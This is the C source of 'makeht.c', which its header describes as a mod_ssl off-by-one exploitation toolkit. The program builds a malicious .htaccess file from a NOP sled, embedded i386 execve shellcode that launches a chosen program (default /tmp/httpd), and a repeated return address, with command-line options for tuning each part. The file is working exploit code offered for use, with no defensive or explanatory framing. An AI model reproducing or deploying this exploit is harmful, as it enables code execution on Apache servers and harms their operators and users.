/*
 * makeht.c
 * mod_ssl off-by-one bug exploiation toolkit.
 * 
 * Use this program to create malicious .htaccess file.
 *
 * grange / nerF <grange@disorder.ru>
 * 
 */


#include <err.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define DEF_DIR "./"
#define DEF_PROG "/tmp/httpd"
#define DEF_BUFSIZE 3000
#define DEF_NOPLEN 500
#define DEF_RETADDR 0xdfbfb6ac
#define NOP 0xfc

static void usage(void);

char execode[] =
   "\xeb\x1c\x5e\x89\xf7\x31\xc0\xb0"
   "\xcc\xfc\xf2\xae\x31\xc0\x88\x47"
   "\xff\x89\x37\x89\x47\x04\x50\x57"
   "\x56\xb0\x3b\x50\xcd\x80\xe8\xdf"
   "\xff\xff\xff";

char *dir = DEF_DIR;
char *prog = DEF_PROG;
int bufsize = DEF_BUFSIZE;
int noplen = DEF_NOPLEN;
unsigned int retaddr = DEF_RETADDR;

int
main(argc, argv)
   int argc;
   char *argv[];
{
   int ch;
   char *buf, *off;
   unsigned int *p;
   int fd;
   char *fullcode, *filename;

   while ((ch = getopt(argc, argv, "hd:p:b:n:r:")) != -1)
      switch (ch) {
      case 'd':
         dir = optarg;
         break;
      case 'p':
         prog = optarg;
         break;
      case 'n':
         noplen = atoi(optarg);
         break;
      case 'r':
         retaddr = strtoul(optarg, NULL, 16);
         break;
      case 'b':
         bufsize = atoi(optarg);
         break;
      case 'h':
      case '?':
      default:
         usage();
         /* NOTREACHED */
      }

   if ((fullcode = malloc(strlen(execode) + strlen(prog) + 2)) == NULL)
      err(1, "malloc()");
   strcpy(fullcode, execode);
   strcat(fullcode, prog);
   strcat(fullcode, "\xcc");

   if ((buf = malloc(bufsize)) == NULL)
      err(1, "malloc()");

   for (p = (unsigned int *)buf; (char *)p < buf + bufsize; p++)
      *p = retaddr;
   memset(buf, NOP, noplen);
   memcpy(buf + noplen, fullcode, strlen(fullcode));

   if ((filename = malloc(strlen(dir) + strlen("/.htaccess") + 1)) == NULL)
      err(1, "malloc()");
   strcpy(filename, dir);
   strcat(filename, "/.htaccess");
   if ((fd = open(filename, O_CREAT | O_TRUNC | O_WRONLY, 0644)) == -1)
      err(1, "open()");
   if (write(fd, buf, bufsize) != bufsize)
      err(1, "write()");
   close(fd);

   return 0;
}

static void
usage()
{
   extern char *__progname;

   fprintf(stderr, "usage: %s [-h] [-d dir] [-p prog] [-n len] [-r addr] "
       "[-b size]\n", __progname);
   fprintf(stderr, "\t-h\tdisplay this message\n");
   fprintf(stderr, "\t-d dir\tdirectory to create .htaccess file in "
       "(default "DEF_DIR")\n");
   fprintf(stderr, "\t-p prog\tprogram to execute (default "DEF_PROG")\n");
   fprintf(stderr, "\t-n len\tnumber of NOPs (default %d)\n", DEF_NOPLEN);
   fprintf(stderr, "\t-r addr\treturn addr (default 0x%x)\n", DEF_RETADDR);
   fprintf(stderr, "\t-b size\tbuffer size (default %d)\n", DEF_BUFSIZE);
   exit(1);
}
